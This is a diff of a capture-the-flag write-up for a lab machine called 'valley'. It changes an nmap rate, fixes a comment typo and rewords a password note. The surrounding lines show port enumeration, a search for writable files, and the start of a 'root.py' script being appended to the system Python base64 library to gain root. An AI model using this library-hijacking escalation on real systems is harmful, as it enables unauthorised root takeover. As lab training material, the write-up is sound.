@@ -70,7 +70,7 @@ $ curl -v 10.10.74.209
 
 ## Nmap enumeration
 ```bash
-$ nmap -sC -sV -p$(nmap --min-rate=1000 -T4 -p- 10.10.74.209 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') 10.10.74.209 -oN tcp.txt  
+$ nmap -sC -sV -p$(nmap --min-rate=2000 -T4 -p- 10.10.74.209 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') 10.10.74.209 -oN tcp.txt  
 
 Host is up (0.24s latency).
 Not shown: 65532 closed tcp ports (reset)
@@ -300,7 +300,7 @@ valley@valley:~$ find / -type f -perm -775 -exec ls -al {} \; 2>/dev/null
 > root.py 
 ```py
 #!/usr/bin/env python3 
-# garining root
+# gaining root
 
 import os
 import socket
@@ -330,7 +330,7 @@ valley@valley:~$ cat /dev/null > base64.py
 # without touching file
 valley@valley:~$ cat /tmp/root.py >> /usr/lib/python3.8/base64.py
 
-# after running do not enter password 
+# while executing file do enter password
 valley@valley:~$ sudo ./base64.py
 ``` 
 ```bash
